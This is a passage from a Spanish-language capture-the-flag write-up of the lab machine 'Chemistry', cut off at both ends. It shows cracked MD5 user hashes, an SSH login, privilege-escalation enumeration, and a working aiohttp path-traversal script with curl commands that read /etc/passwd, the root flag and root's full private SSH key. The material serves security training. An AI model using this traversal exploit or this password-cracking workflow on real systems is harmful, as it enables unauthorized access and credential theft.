+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">12|fabian|4e5d71f53fdd2eabdbabb233113b5dc0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">13|axel|9347f9724ca083b17e39555c36fd9007
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">14|kristel|6896ba7b11a62cacffbdaded457c6d92
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">15|hjg|abe13ce258f6eda2607f89d65701af7f
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">16|root|5f4dcc3b5aa765d61d8327deb882cf99
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">17|user|ee11cbb19052e40b07aac0ca060c23ee
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">18|hello|5d41402abc4b2a76b9719d911017c592
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">19|test|16d7a4fca7442dda3ad93c9a726597e4&#39;</span> | awk <span style="color:#e6db74">&#39;{print $3}&#39;</span> FS<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;|&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2861debaf8d99436a10ed6f75a252abf
+</span></span><span style="display:flex;"><span>197865e46b878d9e74a0346b6d59886a
+</span></span><span style="display:flex;"><span>63ed86ee9f624c7b14f1d4f43dc251a5
+</span></span><span style="display:flex;"><span>02fcf7cfc10adc37959fb21f06c6b467
+</span></span><span style="display:flex;"><span>3dec299e06f7ed187bac06bd3b670ab2
+</span></span><span style="display:flex;"><span>9ad48828b0955513f7cf0f7f6510c8f8
+</span></span><span style="display:flex;"><span>6845c17d298d95aa942127bdad2ceb9b
+</span></span><span style="display:flex;"><span>c3601ad2286a4293868ec2a4bc606ba3
+</span></span><span style="display:flex;"><span>a4aa55e816205dc0389591c9f82f43bb
+</span></span><span style="display:flex;"><span>6cad48078d0241cca9a7b322ecd073b3
+</span></span><span style="display:flex;"><span>4af70c80b68267012ecdac9a7e916d18
+</span></span><span style="display:flex;"><span>4e5d71f53fdd2eabdbabb233113b5dc0
+</span></span><span style="display:flex;"><span>9347f9724ca083b17e39555c36fd9007
+</span></span><span style="display:flex;"><span>6896ba7b11a62cacffbdaded457c6d92
+</span></span><span style="display:flex;"><span>abe13ce258f6eda2607f89d65701af7f
+</span></span><span style="display:flex;"><span>5f4dcc3b5aa765d61d8327deb882cf99
+</span></span><span style="display:flex;"><span>ee11cbb19052e40b07aac0ca060c23ee
+</span></span><span style="display:flex;"><span>5d41402abc4b2a76b9719d911017c592
+</span></span><span style="display:flex;"><span>16d7a4fca7442dda3ad93c9a726597e4
+</span></span></code></pre></div><p>Y en [[CrackStation]] metemos los [[Hash]]es y esto es lo que nos sale:</p>
+<p>![[Pasted image 20250310135236.png]]</p>
+<p>Aquí nos proporciono [[CrackStation]] un numero de contraseñas potenciales para acceder a algún usuario.</p>
+<p>Esto también se podría haber realizado de manera Local en nuestra [[Terminal]], ya que podíamos deducir que podría ser [[Hash MD5]] y con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>nvim contraseñas.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e">##Añadir todo el listado de los Hashes</span>
+</span></span><span style="display:flex;"><span>hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> contraseñas.txt /usr/share/wordlists/rockyou.txt --force
+</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>You have enabled --force to bypass dangerous warnings and errors!
+</span></span><span style="display:flex;"><span>This can hide serious problems and should only be <span style="color:#66d9ef">done</span> when debugging.
+</span></span><span style="display:flex;"><span>Do not report hashcat issues encountered when using --force.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>OpenCL API <span style="color:#f92672">(</span>OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG<span style="color:#f92672">)</span> - Platform <span style="color:#75715e">#1 [The pocl project]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">==================================================================================================================================================</span>
+</span></span><span style="display:flex;"><span>* Device <span style="color:#75715e">#1: pthread-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2899/5862 MB (1024 MB allocatable), 2MCU</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Minimum password length supported by kernel: <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>Maximum password length supported by kernel: <span style="color:#ae81ff">256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Hashes: <span style="color:#ae81ff">19</span> digests; <span style="color:#ae81ff">19</span> unique digests, <span style="color:#ae81ff">1</span> unique salts
+</span></span><span style="display:flex;"><span>Bitmaps: <span style="color:#ae81ff">16</span> bits, <span style="color:#ae81ff">65536</span> entries, 0x0000ffff mask, <span style="color:#ae81ff">262144</span> bytes, 5/13 rotates
+</span></span><span style="display:flex;"><span>Rules: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Optimizers applied:
+</span></span><span style="display:flex;"><span>* Zero-Byte
+</span></span><span style="display:flex;"><span>* Early-Skip
+</span></span><span style="display:flex;"><span>* Not-Salted
+</span></span><span style="display:flex;"><span>* Not-Iterated
+</span></span><span style="display:flex;"><span>* Single-Salt
+</span></span><span style="display:flex;"><span>* Raw-Hash
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ATTENTION! Pure <span style="color:#f92672">(</span>unoptimized<span style="color:#f92672">)</span> backend kernels selected.
+</span></span><span style="display:flex;"><span>Pure kernels can crack longer passwords, but drastically reduce performance.
+</span></span><span style="display:flex;"><span>If you want to switch to optimized kernels, append -O to your commandline.
+</span></span><span style="display:flex;"><span>See the above message to find out about the exact limits.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Watchdog: Temperature abort trigger set to 90c
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host memory required <span style="color:#66d9ef">for</span> this attack: <span style="color:#ae81ff">0</span> MB
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dictionary cache hit:
+</span></span><span style="display:flex;"><span>* Filename..: /usr/share/wordlists/rockyou.txt
+</span></span><span style="display:flex;"><span>* Passwords.: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>* Bytes.....: <span style="color:#ae81ff">139921507</span>
+</span></span><span style="display:flex;"><span>* Keyspace..: <span style="color:#ae81ff">14344385</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>5f4dcc3b5aa765d61d8327deb882cf99:password                 
+</span></span><span style="display:flex;"><span>5d41402abc4b2a76b9719d911017c592:hello                    
+</span></span><span style="display:flex;"><span>9ad48828b0955513f7cf0f7f6510c8f8:carlos123                
+</span></span><span style="display:flex;"><span>16d7a4fca7442dda3ad93c9a726597e4:test1234                 
+</span></span><span style="display:flex;"><span>6845c17d298d95aa942127bdad2ceb9b:peterparker              
+</span></span><span style="display:flex;"><span>c3601ad2286a4293868ec2a4bc606ba3:victoria123              
+</span></span><span style="display:flex;"><span>63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados 
+</span></span></code></pre></div><p>Y para identificarlos nos deja la contraseña resuelta y con el [[Hash]] al lado para poder asi identificar de cual usuario es la contraseña que nos proporcionó.</p>
+<p>Sabiendo ya la contraseñas de los usuarios, mediante [[SSH]] podemos entrar a la maquina con mayor facilidad y así conseguir la flag de <strong>user.txt</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ssh rosa@10.10.11.38
+</span></span><span style="display:flex;"><span>rosa@10.10.11.38<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>--Texto de SSH--
+</span></span><span style="display:flex;"><span>rosa@chemistry:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>rosa@chemistry:~$ cat user.txt 
+</span></span><span style="display:flex;"><span>028d4e71aa5957e539e9a5c0d5f5e1d4
+</span></span></code></pre></div><p>Ya conectado a la maquina lo que queremos ahora es hacer una Escalada de Privilegios.</p>
+<p>Una de las cosas que podemos hacer para saber si nuestro usuario tiene algún [[Privilegio SUID]] con el siguiente comando:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rosa@chemistry:~$ find / -perm -4000 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/snap/snapd/21759/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/mount
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/su
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/umount
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/bin/umount
+</span></span><span style="display:flex;"><span>/usr/bin/fusermount
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/at
+</span></span><span style="display:flex;"><span>/usr/bin/mount
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/su
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/lib/snapd/snap-confine
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/policykit-1/polkit-agent-helper-1
+</span></span></code></pre></div><p>Aquí se puede apreciar que no sale nada fuera de lo común.</p>
+<p>También podremos [[Listar Capabilities]] desde las [[Raiz]] para inspeccionar mas.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rosa@chemistry:~$ getcap -r / 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/snap/core20/2379/usr/bin/ping <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/traceroute6.iputils <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/mtr-packet <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/bin/ping <span style="color:#f92672">=</span> cap_net_raw+ep
+</span></span><span style="display:flex;"><span>/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span style="color:#f92672">=</span> cap_net_bind_service,cap_net_admin+ep
+</span></span></code></pre></div><p>Esto no es nada fuera de lo normal. ya que esto no nos deja hacer nada en especial con ello.</p>
+<p>Ahora lo que podemos ver que hay detrás de la maquina mirando los Procesos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>ps -faux
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Sale muchos procesos que no nos sirven, pero destacamos uno que nos puede servir</span>
+</span></span><span style="display:flex;"><span>root        <span style="color:#ae81ff">1073</span>  0.0  2.4 <span style="color:#ae81ff">424784</span> <span style="color:#ae81ff">48912</span> ?        Ssl  Mar10   0:22 /usr/bin/python3.9 /opt/monitoring_site/app.py
+</span></span><span style="display:flex;"><span>cat /opt/monitoring_site/app.py
+</span></span><span style="display:flex;"><span>cat: /opt/monitoring_site/app.py: Permission denied
+</span></span></code></pre></div><p>Lo que podemos ver es que si se están empleando otros puertos, ya que la ejecución de <strong>app.py</strong> no es el mismo servicio al cual nosotros usamos para acceder.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rosa@chemistry:~$ ss -nltp
+</span></span><span style="display:flex;"><span>State                 Recv-Q                Send-Q                               Local Address:Port                               Peer Address:Port               Process               
+</span></span><span style="display:flex;"><span>LISTEN                <span style="color:#ae81ff">0</span>                     <span style="color:#ae81ff">4096</span>                                 127.0.0.53%lo:53                                      0.0.0.0:*                                        
+</span></span><span style="display:flex;"><span>LISTEN                <span style="color:#ae81ff">0</span>                     <span style="color:#ae81ff">128</span>                                        0.0.0.0:22                                      0.0.0.0:*                                        
+</span></span><span style="display:flex;"><span>LISTEN                <span style="color:#ae81ff">0</span>                     <span style="color:#ae81ff">128</span>                                        0.0.0.0:5000                                    0.0.0.0:*                                        
+</span></span><span style="display:flex;"><span>LISTEN                <span style="color:#ae81ff">0</span>                     <span style="color:#ae81ff">128</span>                                      127.0.0.1:8080                                    0.0.0.0:*                                        
+</span></span><span style="display:flex;"><span>LISTEN                <span style="color:#ae81ff">0</span>                     <span style="color:#ae81ff">128</span>                                           <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:22                                         <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*    
+</span></span></code></pre></div><p>Vemos que hay nuevos puertos que no lo detectamos con [[0 Ciberseguridad/1 Herramientas y Conceptos/Nmap/Nmap]] esto es interesante, ya que podemos hacer un [[Curl]] para saber que hay.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl localhost:8080
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Tambien podemos ver la cabeceras de repuestas</span>
+</span></span><span style="display:flex;"><span>curl localhost:8080 -I
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset<span style="color:#f92672">=</span>utf-8
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">5971</span>
+</span></span><span style="display:flex;"><span>Date: Tue, <span style="color:#ae81ff">11</span> Mar <span style="color:#ae81ff">2025</span> 12:15:01 GMT
+</span></span><span style="display:flex;"><span>Server: Python/3.9 aiohttp/3.9.1
+</span></span></code></pre></div><p>Con esto podemos ver si el [[Python]]/3.9 aiohttp/3.9.1 tiene algún tipo de vulnerabilidad como caundo comprobamos los servicios de los puertos abiertos.</p>
+<p>![[Pasted image 20250311122558.png]]</p>
+<p>![[Pasted image 20250311122816.png]]</p>
+<p>Nos metemos y vemos el [[Exploit]].sh que tiene el Repositorio [[GitHub]] donde dice ser que hay una vulnerabilidad en [[Python]]/3.9 aiohttp/3.9.1.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:8081&#34;</span>
+</span></span><span style="display:flex;"><span>string<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../&#34;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/&#34;</span>
+</span></span><span style="display:flex;"><span>file<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;etc/passwd&#34;</span> <span style="color:#75715e"># without the first /</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#f92672">((</span>i<span style="color:#f92672">=</span>0; i&lt;15; i++<span style="color:#f92672">))</span>; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>    payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;</span>$string<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    echo <span style="color:#e6db74">&#34;[+] Testing with </span>$payload$file<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    status_code<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl --path-as-is -s -o /dev/null -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> <span style="color:#e6db74">&#34;</span>$url$payload$file<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>    echo -e <span style="color:#e6db74">&#34;\tStatus code --&gt; </span>$status_code<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> $status_code -eq <span style="color:#ae81ff">200</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
+</span></span><span style="display:flex;"><span>        curl -s --path-as-is <span style="color:#e6db74">&#34;</span>$url$payload$file<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        break
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><p>Con esto podemos ver lo que hace para que [[Python]]/3.9 aiohttp/3.9.1 sea vulnerable y como con esto que lo tiene alojado el [[Root]] podemos de alguna manera a los contenidos que tienen alojado en el /[[Root]] y así poder coger la [[Root]].txt.</p>
+<p>Lo puntos claves de este [[Exploit]] son los siguientes puntos en cuestión:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost:8081&#34;</span>
+</span></span><span style="display:flex;"><span>string<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;../&#34;</span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;/static/&#34;</span>
+</span></span><span style="display:flex;"><span>file<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;etc/passwd&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload<span style="color:#f92672">+=</span><span style="color:#e6db74">&#34;</span>$string<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>status_code<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl --path-as-is -s -o /dev/null -w <span style="color:#e6db74">&#34;%{http_code}&#34;</span> <span style="color:#e6db74">&#34;</span>$url$payload$file<span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">)</span>
+</span></span></code></pre></div><p>Con esto podemos sonsacar que la vulnerabilidad en cuestión de [[Python]]/3.9 aiohttp/3.9.1 se podría sacar con lo siguiente, ya que como hemos visto anteriormente [[Root]] estaba corriendo <strong>app.py</strong> que este podría ser el servicio que se esta corriendo por el [[Puerto]] <strong>8080</strong>:</p>
+<p>Prueba para ver si funciona:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://localhost:8080/assets/../../../../etc/passwd&#34;</span> --path-as-is
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Se puede ver el /etc/passwd</span>
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
+</span></span></code></pre></div><p>Ya una vez viendo que este [[Exploit]] funciona lo que podemos hacer es ver la <strong>Flag</strong> [[Root]].txt o también lo que podemos hacer es descargar la clave de [[RSA]] para poder acceder a la maquina desde [[SSH]] con el usuario [[Root]].</p>
+<p>Como seria conseguir solo la <strong>Flag</strong> con este [[Exploit]]:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rosa@chemistry:~$ curl -s -X GET <span style="color:#e6db74">&#34;http://localhost:8080/assets/../../../../root/root.txt&#34;</span> --path-as-is
+</span></span><span style="display:flex;"><span>3343c681d871dfc80713a675982e3c84
+</span></span></code></pre></div><p>Como seria conseguir la Id_[[RSA]] del Usuario [[Root]] para asi porder conectarnos por [[SSH]].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://localhost:8080/assets/../../../../root/.ssh/id_rsa&#34;</span> --path-as-is
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAYEAsFbYzGxskgZ6YM1LOUJsjU66WHi8Y2ZFQcM3G8VjO+NHKK8P0hIU
+</span></span><span style="display:flex;"><span>UbnmTGaPeW4evLeehnYFQleaC9u//vciBLNOWGqeg6Kjsq2lVRkAvwK2suJSTtVZ8qGi1v
+</span></span><span style="display:flex;"><span>j0wO69QoWrHERaRqmTzranVyYAdTmiXlGqUyiy0I7GVYqhv/QC7jt6For4PMAjcT0ED3Gk
+</span></span><span style="display:flex;"><span>HVJONbz2eav5aFJcOvsCG1aC93Le5R43Wgwo7kHPlfM5DjSDRqmBxZpaLpWK3HwCKYITbo
+</span></span><span style="display:flex;"><span>DfYsOMY0zyI0k5yLl1s685qJIYJHmin9HZBmDIwS7e2riTHhNbt2naHxd0WkJ8PUTgXuV2
+</span></span><span style="display:flex;"><span>UOljWP/TVPTkM5byav5bzhIwxhtdTy02DWjqFQn2kaQ8xe9X+Ymrf2wK8C4ezAycvlf3Iv
+</span></span><span style="display:flex;"><span>ATj++Xrpmmh9uR1HdS1XvD7glEFqNbYo3Q/OhiMto1JFqgWugeHm715yDnB3A+og4SFzrE
+</span></span><span style="display:flex;"><span>vrLegAOwvNlDYGjJWnTqEmUDk9ruO4Eq4ad1TYMbAAAFiPikP5X4pD+VAAAAB3NzaC1yc2
+</span></span><span style="display:flex;"><span>EAAAGBALBW2MxsbJIGemDNSzlCbI1Oulh4vGNmRUHDNxvFYzvjRyivD9ISFFG55kxmj3lu
+</span></span><span style="display:flex;"><span>Hry3noZ2BUJXmgvbv/73IgSzTlhqnoOio7KtpVUZAL8CtrLiUk7VWfKhotb49MDuvUKFqx
+</span></span><span style="display:flex;"><span>xEWkapk862p1cmAHU5ol5RqlMostCOxlWKob/0Au47ehaK+DzAI3E9BA9xpB1STjW89nmr
+</span></span><span style="display:flex;"><span>+WhSXDr7AhtWgvdy3uUeN1oMKO5Bz5XzOQ40g0apgcWaWi6Vitx8AimCE26A32LDjGNM8i
+</span></span><span style="display:flex;"><span>NJOci5dbOvOaiSGCR5op/R2QZgyMEu3tq4kx4TW7dp2h8XdFpCfD1E4F7ldlDpY1j/01T0
+</span></span><span style="display:flex;"><span>5DOW8mr+W84SMMYbXU8tNg1o6hUJ9pGkPMXvV/mJq39sCvAuHswMnL5X9yLwE4/vl66Zpo
+</span></span><span style="display:flex;"><span>fbkdR3UtV7w+4JRBajW2KN0PzoYjLaNSRaoFroHh5u9ecg5wdwPqIOEhc6xL6y3oADsLzZ
+</span></span><span style="display:flex;"><span>Q2BoyVp06hJlA5Pa7juBKuGndU2DGwAAAAMBAAEAAAGBAJikdMJv0IOO6/xDeSw1nXWsgo
+</span></span><span style="display:flex;"><span>325Uw9yRGmBFwbv0yl7oD/GPjFAaXE/99+oA+DDURaxfSq0N6eqhA9xrLUBjR/agALOu/D
+</span></span><span style="display:flex;"><span>p2QSAB3rqMOve6rZUlo/QL9Qv37KvkML5fRhdL7hRCwKupGjdrNvh9Hxc+WlV4Too/D4xi
+</span></span><span style="display:flex;"><span>JiAKYCeU7zWTmOTld4ErYBFTSxMFjZWC4YRlsITLrLIF9FzIsRlgjQ/LTkNRHTmNK1URYC
+</span></span><span style="display:flex;"><span>Fo9/UWuna1g7xniwpiU5icwm3Ru4nGtVQnrAMszn10E3kPfjvN2DFV18+pmkbNu2RKy5mJ
+</span></span><span style="display:flex;"><span>XpfF5LCPip69nDbDRbF22stGpSJ5mkRXUjvXh1J1R1HQ5pns38TGpPv9Pidom2QTpjdiev
+</span></span><span style="display:flex;"><span>dUmez+ByylZZd2p7wdS7pzexzG0SkmlleZRMVjobauYmCZLIT3coK4g9YGlBHkc0Ck6mBU
+</span></span><span style="display:flex;"><span>HvwJLAaodQ9Ts9m8i4yrwltLwVI/l+TtaVi3qBDf4ZtIdMKZU3hex+MlEG74f4j5BlUQAA
+</span></span><span style="display:flex;"><span>AMB6voaH6wysSWeG55LhaBSpnlZrOq7RiGbGIe0qFg+1S2JfesHGcBTAr6J4PLzfFXfijz
+</span></span><span style="display:flex;"><span>syGiF0HQDvl+gYVCHwOkTEjvGV2pSkhFEjgQXizB9EXXWsG1xZ3QzVq95HmKXSJoiw2b+E
+</span></span><span style="display:flex;"><span>9F6ERvw84P6Opf5X5fky87eMcOpzrRgLXeCCz0geeqSa/tZU0xyM1JM/eGjP4DNbGTpGv4
+</span></span><span style="display:flex;"><span>PT9QDq+ykeDuqLZkFhgMped056cNwOdNmpkWRIck9ybJMvEA8AAADBAOlEI0l2rKDuUXMt
+</span></span><span style="display:flex;"><span>XW1S6DnV8OFwMHlf6kcjVFQXmwpFeLTtp0OtbIeo7h7axzzcRC1X/J/N+j7p0JTN6FjpI6
+</span></span><span style="display:flex;"><span>yFFpg+LxkZv2FkqKBH0ntky8F/UprfY2B9rxYGfbblS7yU6xoFC2VjUH8ZcP5+blXcBOhF
+</span></span><span style="display:flex;"><span>hiv6BSogWZ7QNAyD7OhWhOcPNBfk3YFvbg6hawQH2c0pBTWtIWTTUBtOpdta0hU4SZ6uvj
+</span></span><span style="display:flex;"><span>71odqvPNiX+2Hc/k/aqTR8xRMHhwPxxwAAAMEAwYZp7+2BqjA21NrrTXvGCq8N8ZZsbc3Z
+</span></span><span style="display:flex;"><span>2vrhTfqruw6TjUvC/t6FEs3H6Zw4npl+It13kfc6WkGVhsTaAJj/lZSLtN42PXBXwzThjH
+</span></span><span style="display:flex;"><span>giZfQtMfGAqJkPIUbp2QKKY/y6MENIk5pwo2KfJYI/pH0zM9l94eRYyqGHdbWj4GPD8NRK
+</span></span><span style="display:flex;"><span>OlOfMO4xkLwj4rPIcqbGzi0Ant/O+V7NRN/mtx7xDL7oBwhpRDE1Bn4ILcsneX5YH/XoBh
+</span></span><span style="display:flex;"><span>1arrDbm+uzE+QNAAAADnJvb3RAY2hlbWlzdHJ5AQIDBA<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
+</span></span></code></pre></div><p>Añadiendole al final del [[Curl]] lo suiguiente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>curl -s -X GET <span style="color:#e6db74">&#34;http://localhost:8080/assets/../../../../root/.ssh/id_rsa&#34;</span> --path-as-is &gt; /tmp/id_rsa
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## &gt; /tmp/id_rsa es para tranferir la id_rsa al usuario rosa al directorio /tmp</span>
+</span></span></code></pre></div><p>Por consiguiente lo que tenemos que hacer quitar le los permisos para que solo el propietario lo pueda escribir para prevenir los típicos errores por privilegios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rosa@chemistry:/tmp$ chmod <span style="color:#ae81ff">600</span> id_rsa
+</span></span><span style="display:flex;"><span>rosa@chemistry:/tmp$ ls -l id_rsa
+</span></span><span style="display:flex;"><span>-rw------- <span style="color:#ae81ff">1</span> rosa rosa <span style="color:#ae81ff">2602</span> Mar <span style="color:#ae81ff">11</span> 12:57 id_rsa
